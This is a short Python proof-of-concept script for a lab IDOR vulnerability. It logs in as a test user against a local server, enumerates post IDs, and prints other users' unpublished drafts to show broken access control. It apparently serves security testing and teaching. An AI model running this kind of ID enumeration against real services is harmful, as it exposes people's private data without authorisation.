#!/usr/bin/env python3
"""VULN-3 PoC — IDOR: bob enumerates post IDs and reads other users' drafts.

LAB USE ONLY — targets http://127.0.0.1:5000.

    python poc/idor.py
"""
from lab_client import BASE, login


def main():
    s = login("bob", "bob-pass-123")
    me = s.get(f"{BASE}/api/me/posts").json()
    my_ids = {p["id"] for p in me}
    leaked = 0
    for post_id in range(1, 21):
        r = s.get(f"{BASE}/api/posts/{post_id}")
        if r.status_code != 200:
            continue
        p = r.json()
        if post_id not in my_ids and not p["is_published"]:
            leaked += 1
            print(f"[!] Draft #{post_id} by {p['author']}: {p['title']!r}")
            print(f"    {p['body'][:120]!r}")
        # Also show that the editor exposes the draft and accepts writes.
    if leaked:
        print(f"\n[!] VULNERABLE: read {leaked} draft(s) belonging to other users.")
    else:
        print("[✓] Not exploitable: other users' drafts return 404.")


if __name__ == "__main__":
    main()
